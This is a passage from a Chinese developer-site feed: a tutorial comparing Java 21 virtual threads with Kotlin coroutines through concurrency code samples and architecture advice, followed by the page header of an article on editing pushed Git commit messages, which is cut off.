title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=WebFlux&amp;zhida_source=entity" ref="nofollow noopener noreferrer">WebFlux</a>、RxJava。性能是上去了，但代价是<strong>代码可读性崩塌</strong>。你得写各种回调，堆栈信息（Stack Trace）乱得像一团浆糊，调试简直是噩梦。</li>
</ol>
<p><strong>Kotlin 协程</strong> 在几年前横空出世，用“挂起函数”（Suspend Function）这种语法糖，让我们能用同步的代码风格写<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25BC%2582%25E6%25AD%25A5%25E9%2580%25BB%25E8%25BE%2591%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E5%BC%82%E6%AD%A5%E9%80%BB%E8%BE%91&amp;zhida_source=entity" ref="nofollow noopener noreferrer">异步逻辑</a>，确实收割了一大波好感。</p>
<p>但现在，<strong>Java 21 带着虚拟线程（Virtual Threads）来了</strong>。官方号称： <strong>“Write sync, run async”</strong> （写着是同步，跑起来是异步）。它不需要引入额外的关键字（比如 <code>suspend</code>），不需要修改代码结构，就能获得百万级并发。</p>
<p>这是否意味着 Kotlin 协程要凉？咱们往下看。</p>
<hr/>
<h2 data-id="heading-1">二、 核心原理拆解：M:N 模型之争</h2>
<p>要理解它们的区别，必须先看底层模型。</p>
<h3 data-id="heading-2">1. 传统的 Java <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E7%25BA%25BF%25E7%25A8%258B%25E6%25A8%25A1%25E5%259E%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">线程模型</a>（1:1）</h3>
<p>在 Java 19 之前，Java 的 <code>java.lang.Thread</code> 是一一对应操作系统的<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%2586%2585%25E6%25A0%25B8%25E7%25BA%25BF%25E7%25A8%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">内核线程</a>的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd85cfd8501446c595ca2109c99ac695~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879474&amp;x-signature=SEc5CN6ZhA8gmf%2FT7ST1lz%2BdjWo%3D" alt="" loading="lazy"/></p>
<p>这种模型最大的瓶颈在于：<strong>OS 线程是稀缺资源</strong>。</p>
<h3 data-id="heading-3">2. 虚拟线程与协程的通用模型（M:N）</h3>
<p>无论是 Java 虚拟线程还是 Kotlin 协程，本质上都是 <strong>User-Mode Threads（用户态线程）</strong> 。它们的调度在 JVM 层或语言库层完成，而不是由 OS 调度。</p>
<ul>
<li><strong>M 个虚拟线程</strong> 映射到 <strong>N 个<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25B9%25B3%25E5%258F%25B0%25E7%25BA%25BF%25E7%25A8%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E5%B9%B3%E5%8F%B0%E7%BA%BF%E7%A8%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">平台线程</a>（Carrier Threads）</strong>  上。</li>
<li>当虚拟线程执行阻塞 I/O（如查数据库、调 HTTP 接口）时，它会<strong>卸载（Unmount）</strong> ，把底层的平台线程让出来去执行其他任务。</li>
<li>I/O 结束后，虚拟线程被<strong>挂载（Mount）</strong>  回平台线程继续执行。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22b16260eea74784b04846529830a759~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879474&amp;x-signature=SpXj9cmbDrX1%2B1C9388mRvqLoMs%3D" alt="" loading="lazy"/></p>
<p><strong>关键区别在于实现方式：</strong></p>
<ul>
<li><strong>Kotlin 协程</strong>：基于<strong>编译器</strong>。编译器会将 <code>suspend</code> 函数转换成状态机（State Machine）。这是一种<strong>有栈协程（Stackless Coroutine）的模拟</strong>（虽然 Kotlin 协程表现得像有栈，但底层是 Continuation Passing Style）。它具有<strong>传染性</strong>（Function Coloring），异步函数必须标为 <code>suspend</code>，且只能被其他 <code>suspend</code> 函数调用。</li>
<li><strong>Java 虚拟线程</strong>：基于 <strong>JVM 运行时</strong>。JVM 也就是 HotSpot 内部重写了所有的<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E9%2598%25BB%25E5%25A1%259E%25E8%25B0%2583%25E7%2594%25A8%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E9%98%BB%E5%A1%9E%E8%B0%83%E7%94%A8&amp;zhida_source=entity" ref="nofollow noopener noreferrer">阻塞调用</a>（Socket, Lock, Sleep）。当你调用 <code>Thread.sleep</code> 或 <code>socket.read</code> 时，JVM 自动把当前虚拟线程的栈帧（Stack Frame）保存到堆内存中，然后挂起。这对开发者是<strong>透明</strong>的。你不需要加任何关键字。</li>
</ul>
<hr/>
<h2 data-id="heading-4">三、 代码实战：刀刀见血</h2>
<p>光说不练假把式。我们通过 6 个例子来对比。</p>
<h3 data-id="heading-5">场景一：创建 10 万个<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25B9%25B6%25E5%258F%2591%25E4%25BB%25BB%25E5%258A%25A1%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E5%B9%B6%E5%8F%91%E4%BB%BB%E5%8A%A1&amp;zhida_source=entity" ref="nofollow noopener noreferrer">并发任务</a></h3>
<p>我们要模拟 10 万个任务，每个任务睡 1 秒。</p>
<h3 data-id="heading-6">示例 1: Java 21 虚拟线程</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.Duration;
<span class="hljs-keyword">import</span> java.time.Instant;
<span class="hljs-keyword">import</span> java.util.concurrent.Executors;
<span class="hljs-keyword">import</span> java.util.stream.IntStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">var</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Instant.now();
        
        <span class="hljs-comment">// 使用虚拟线程执行器</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
            IntStream.range(<span class="hljs-number">0</span>, <span class="hljs-number">100_000</span>).forEach(i -&gt; {
                executor.submit(() -&gt; {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">// 这里的 sleep 不会阻塞 OS 线程，只会卸载虚拟线程</span>
                        Thread.sleep(<span class="hljs-number">1000</span>); 
                    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                        <span class="hljs-comment">// handle exception</span>
                    }
                    <span class="hljs-keyword">return</span> i;
                });
            });
        } <span class="hljs-comment">// try-with-resources 会自动等待所有任务完成</span>

        <span class="hljs-type">var</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> Instant.now();
        System.out.println(<span class="hljs-string">"耗时: "</span> + Duration.between(start, end).toMillis() + <span class="hljs-string">"ms"</span>);
    }
}
</code></pre>
<p><strong>运行结果说明</strong>：耗时大约在 1000ms 多一点点。如果是传统<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E7%25BA%25BF%25E7%25A8%258B%25E6%25B1%25A0%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E7%BA%BF%E7%A8%8B%E6%B1%A0&amp;zhida_source=entity" ref="nofollow noopener noreferrer">线程池</a>，10 万个线程直接 OOM 或者卡死。</p>
<h3 data-id="heading-7">示例 2: Kotlin 协程</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlinx.coroutines.*
<span class="hljs-keyword">import</span> kotlin.system.measureTimeMillis

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> time = measureTimeMillis {
        <span class="hljs-keyword">val</span> jobs = List(<span class="hljs-number">100_000</span>) {
            launch {
                delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 挂起函数，非阻塞</span>
            }
        }
        jobs.joinAll()
    }
    println(<span class="hljs-string">"耗时: <span class="hljs-subst">${time}</span>ms"</span>)
}
</code></pre>
<p><strong>运行结果说明</strong>：同样也是 1000ms 出头。性能上两者在纯 I/O 场景下<strong>不分伯仲</strong>。</p>
<p><strong>💡 架构师点评</strong>： Java 的优势在于<strong>没有心智负担</strong>。你用的是熟悉的 <code>ExecutorService</code>，熟悉的 <code>Thread.sleep</code>。而 Kotlin 需要理解 <code>runBlocking</code>、<code>launch</code>、<code>delay</code> 以及 <code>CoroutineScope</code>。</p>
<hr/>
<h3 data-id="heading-8">场景二：结构化并发（Structured Concurrency）</h3>
<p>这是<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3D%25E9%25AB%2598%25E5%25B9%25B6%25E5%258F%2591%25E7%25BC%2596%25E7%25A8%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=%E9%AB%98%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">高并发编程</a>中非常重要的概念：<strong>父任务应该等待子任务完成，如果子任务失败，应该能够优雅地取消其他兄弟任务。</strong></p>
<h3 data-id="heading-9">示例 3: Kotlin 的结构化并发（原生支持）</h3>
<p>Kotlin 天生支持结构化并发，这是它的杀手锏。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserData</span><span class="hljs-params">()</span></span>: String = coroutineScope {
    <span class="hljs-keyword">val</span> userDeferred = async { 
        delay(<span class="hljs-number">100</span>); <span class="hljs-string">"User: Howell"</span> 
    }
    <span class="hljs-keyword">val</span> ordersDeferred = async { 
        delay(<span class="hljs-number">200</span>); <span class="hljs-string">"Orders: [A, B]"</span> 
    }
    
    <span class="hljs-comment">// 如果 fetchOrders 失败，fetchUser 也会被取消</span>
    <span class="hljs-string">"<span class="hljs-subst">${userDeferred.await()}</span> | <span class="hljs-subst">${ordersDeferred.await()}</span>"</span>
}
</code></pre>
<h3 data-id="heading-10">示例 4: Java 21 的结构化并发（Preview API）</h3>
<p>Java 21 引入了 <code>StructuredTaskScope</code>（目前是 Preview 功能，但在 Java 21+ 生产中已有人尝试使用）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.StructuredTaskScope;
<span class="hljs-keyword">import</span> java.util.concurrent.ExecutionException;
<span class="hljs-keyword">import</span> java.util.function.Supplier;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StructuredConcurrencyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
        
        <span class="hljs-comment">// 使用 ShutdownOnFailure 策略：只要有一个失败，就全部取消</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">scope</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StructuredTaskScope</span>.ShutdownOnFailure()) {
            
            Supplier&lt;String&gt; userTask = scope.fork(() -&gt; {
                Thread.sleep(<span class="hljs-number">100</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-string">"User: Howell"</span>;
            });
            
            Supplier&lt;String&gt; orderTask = scope.fork(() -&gt; {
                Thread.sleep(<span class="hljs-number">200</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Orders: [A, B]"</span>;
            });

            scope.join(); <span class="hljs-comment">// 等待所有子任务</span>
            scope.throwIfFailed(); <span class="hljs-comment">// 如果有异常则抛出</span>

            System.out.println(userTask.get() + <span class="hljs-string">" | "</span> + orderTask.get());
        }
    }
}
</code></pre>
<p><strong>运行结果说明</strong>：两者都能实现并行获取数据并在 200ms 左右返回。</p>
<p><strong>💡 架构师点评</strong>： Kotlin 的语法更简洁（<code>async/await</code> 风格）。Java 的 <code>StructuredTaskScope</code> 虽然代码量稍多，但逻辑非常清晰，且通过 <code>try-with-resources</code> 块强制了作用域的生命周期，这是一种非常工程化的设计，防止了“线程泄漏”。</p>
<hr/>
<h3 data-id="heading-11">场景三：生产环境的隐形杀手——<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D1%26q%3DPinning%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=1&amp;q=Pinning&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Pinning</a>（载体线程钉住）</h3>
<p>这是 Java 虚拟线程目前最大的<strong>坑</strong>。</p>
<p>如果你的代码在 <code>synchronized</code> 块中执行了阻塞操作，或者调用了本地方法（Native Method），虚拟线程就会被 <strong>Pin（钉住）</strong>  在平台线程上，无法卸载。这会导致性能退化回传统线程模式，甚至更差。</p>
<h3 data-id="heading-12">示例 5: Java 21 中的 Pinning 问题</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Executors;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PinningDemo</span> {
    
    <span class="hljs-comment">// 这是一个坏习惯：在 synchronized 中做 IO</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            System.out.println(Thread.currentThread() + <span class="hljs-string">" start sleep"</span>);
            Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 这里会导致 Pinning！</span>
            System.out.println(Thread.currentThread() + <span class="hljs-string">" end sleep"</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">var</span> <span class="hljs-variable">demo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PinningDemo</span>();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
            <span class="hljs-comment">// 启动 10 个虚拟线程，但如果 Carrier 线程只有几个，</span>
            <span class="hljs-comment">// 这里的 synchronized 会导致它们串行化，因为虚拟线程无法卸载</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                executor.submit(() -&gt; demo.badMethod());
            }
        }
    }
}
</code></pre>
<p><strong>运行结果说明</strong>：虽然是虚拟线程，但你会发现执行速度变慢了，不再是并行的。JVM 启动参数加上 <code>-Djdk.tracePinnedThreads=short</code> 可以看到警告。</p>
<h3 data-id="heading-13">示例 6: 解决方案 - 使用 ReentrantLock</h3>
<pre><code class="hljs language-csharp" lang="csharp">import java.util.concurrent.locks.ReentrantLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">NoPinningDemo</span> {
    <span class="hljs-keyword">private</span> final ReentrantLock <span class="hljs-keyword">lock</span> = <span class="hljs-keyword">new</span> ReentrantLock();

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">goodMethod</span>()</span> {
        <span class="hljs-keyword">lock</span>.<span class="hljs-keyword">lock</span>(); <span class="hljs-comment">// ReentrantLock 不会导致 Pinning</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 此时虚拟线程可以正常卸载</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">lock</span>.unlock();
        }
    }
    <span class="hljs-comment">// ... main 方法同上，调用 goodMethod</span>
}
</code></pre>
<p><strong>💡 架构师点评</strong>： Kotlin 协程没有这个问题，因为它根本不支持 <code>synchronized</code> 关键字（在挂起函数中），它强迫你使用 <code>Mutex</code>。Java 这种“兼容旧代码”的策略是一把双刃剑，老代码库里的 <code>synchronized</code> 可能是升级 Java 21 最大的雷。</p>
<hr/>
<h2 data-id="heading-14">四、 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269766626%26content_type%3DArticle%26match_order%3D5%26q%3D%25E6%259E%25B6%25E6%259E%2584%25E5%25B8%2588%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269766626&amp;content_type=Article&amp;match_order=5&amp;q=%E6%9E%B6%E6%9E%84%E5%B8%88&amp;zhida_source=entity" ref="nofollow noopener noreferrer">架构师</a>思维：如何选型与避坑</h2>
<p>作为架构师，选型不能只看 Demo，要看生态、维护成本和团队能力。</p>
<h3 data-id="heading-15">1. 常见误区与坑点</h3>
<ul>
<li>
<p><strong>误区：虚拟线程比平台线程快。</strong></p>
</li>
<li>
<ul>
<li><strong>真相</strong>：虚拟线程<strong>不会降低单个请求的延迟</strong>，它提升的是<strong>吞吐量</strong>。如果你的任务是 CPU 密集型（比如计算哈希、视频编码），虚拟线程反而因为调度开销会更慢。它只适合 I/O 密集型任务。</li>
</ul>
</li>
<li>
<p><strong>坑点：ThreadLocal 的滥用。</strong></p>
</li>
<li>
<ul>
<li>
<p>在传统 Web 容器中，我们习惯用 <code>ThreadLocal</code> 存用户信息。但在虚拟线程模式下，一个请求可能产生数千个虚拟线程，如果每个都复制庞大的 <code>ThreadLocal</code> Map，内存会瞬间爆炸。</p>
</li>
<li>
<p><strong>建议</strong>：减少 <code>ThreadLocal</code> 使用，或者切换到 Java 21 的 <code>ScopedValue</code>（预览特性）。</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-16">2. 生态对比</h3>



































<table><thead><tr><th>特性</th><th>Java 21 虚拟线程</th><th>Kotlin 协程</th></tr></thead><tbody><tr><td>学习曲线</td><td>低。几乎不需要改代码习惯。</td><td>中高。需要理解 Scope, Context, Suspend。</td></tr><tr><td>调试体验</td><td>优秀。标准的 Stack Trace，工具链完美支持。</td><td>一般。异步堆栈有时难以追踪。</td></tr><tr><td>生态兼容</td><td>完美。JDBC, Spring, Tomcat 无缝切换。</td><td>割裂。JDBC 是阻塞的，需要用 <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2FDispatchers.IO" target="_blank" title="https://link.zhihu.com/?target=http%3A//Dispatchers.IO" ref="nofollow noopener noreferrer">Dispatchers.IO</a> 包装。</td></tr><tr><td>编程范式</td><td>命令式、同步风格。</td><td>声明式、函数式风格。</td></tr><tr><td>性能上限</td><td>极高（百万级）。</td><td>极高（百万级）。</td></tr></tbody></table>
<h3 data-id="heading-17">3. 邪修版本架构设计（Unorthodox Architecture）</h3>
<p>如果不想重构老代码，又想利用新特性，可以尝试这种“邪修”玩法：</p>
<ul>
<li><strong>Spring Boot 3.2 + 虚拟线程开关</strong>： 在 <code>application.yml</code> 中配置 <code>spring.threads.virtual.enabled=true</code>。 这行配置会让 Tomcat 和 Jetty 的处理线程池直接换成虚拟线程。老的 Controller 代码一行不用改，并发能力瞬间提升 10 倍。</li>
<li><strong>用虚拟线程包装 JDBC</strong>： 以前用 WebFlux 最头疼的是数据库驱动必须是 R2DBC。现在你可以继续用成熟的 HikariCP + MySQL Connector，把它们跑在虚拟线程里，效果等同于异步驱动，但代码极其简单。</li>
</ul>
<hr/>
<h2 data-id="heading-18">五、 总结与 Takeaway</h2>
<p>这场对决没有绝对的赢家，只有最适合的场景。</p>
<p><strong>核心结论：</strong></p>
<ol>
<li><strong>如果你是纯 Java 团队</strong>：<strong>无脑拥抱 Java 21 虚拟线程</strong>。这是 Java 既然 8 之后最大的红利。它抹平了同步和异步的性能鸿沟，让你可以用最简单的代码写出最高性能的服务。</li>
<li><strong>如果你已经是 Kotlin 重度用户</strong>：<strong>继续使用协程</strong>。Kotlin 的结构化并发、Flow 数据流处理、Channel 通信机制，提供了比 Java 更高级的抽象能力。虚拟线程只能替代 <code>launch</code>，替代不了 <code>Flow</code>。</li>
<li><strong>如果你在做遗留系统改造</strong>：Java 21 是救星。别去折腾 WebFlux 了，把 JDK 升上来，开启虚拟线程支持，解决掉 <code>synchronized</code> 的 Pinning 问题，你的系统就能焕发第二春。</li>
</ol>
<p><strong>架构师的建议 (Takeaway)</strong> ：</p>
<blockquote>
<p><strong>不要为了技术而技术。</strong>  虚拟线程解决了“线程不够用”的问题，但没有解决“数据库连接池不够用”的问题。 在高并发架构中，<strong>瓶颈往往会转移</strong>。当你把应用层的并发能力提升了 100 倍，压力就会瞬间传导到数据库和下游服务。 所以，升级 Java 21 的同时，请务必做好<strong>限流（Rate Limiting）</strong> 和<strong>熔断（Circuit Breaking）</strong> 。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[已经 Push 到远程的提交，如何修改 Commit 信息？]]></title>    <link>https://juejin.cn/post/7602921143491248171</link>    <guid>https://juejin.cn/post/7602921143491248171</guid>    <pubDate>2026-02-05T06:58:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602921143491248171" data-draft-id="7602996277664120886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="已经 Push 到远程的提交，如何修改 Commit 信息？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T06:58:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XuCoder"/> <meta itemprop="url" content="https://juejin.cn/user/948203954903908"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            已经 Push 到远程的提交，如何修改 Commit 信息？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/948203954903908/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XuCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:58:43.000Z" title="Thu Feb 05 2026 06:58:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body 